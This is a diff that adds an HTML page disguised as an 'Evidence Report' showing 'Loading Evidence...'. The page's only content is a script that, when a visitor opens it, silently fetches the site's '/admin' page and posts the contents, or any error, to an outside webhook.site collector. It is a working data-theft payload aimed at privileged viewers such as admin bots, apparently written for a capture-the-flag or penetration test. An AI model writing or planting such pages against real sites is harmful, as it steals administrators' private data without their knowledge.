@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Evidence Report</title>
+</head>
+<body>
+    <h1>Loading Evidence...</h1>
+    <script>
+        fetch('/admin')
+            .then(response => response.text())
+            .then(html => {
+                fetch('https://webhook.site/39b0ac7a-0cbe-490b-9fe8-7163267618a6', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain'
+                    },
+                    body: html
+                });
+            })
+            .catch(error => {
+                fetch('https://webhook.site/39b0ac7a-0cbe-490b-9fe8-7163267618a6', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain'
+                    },
+                    body: 'Error: ' + error.toString()
+                });
+            });
+    </script>
+</body>
+</html>
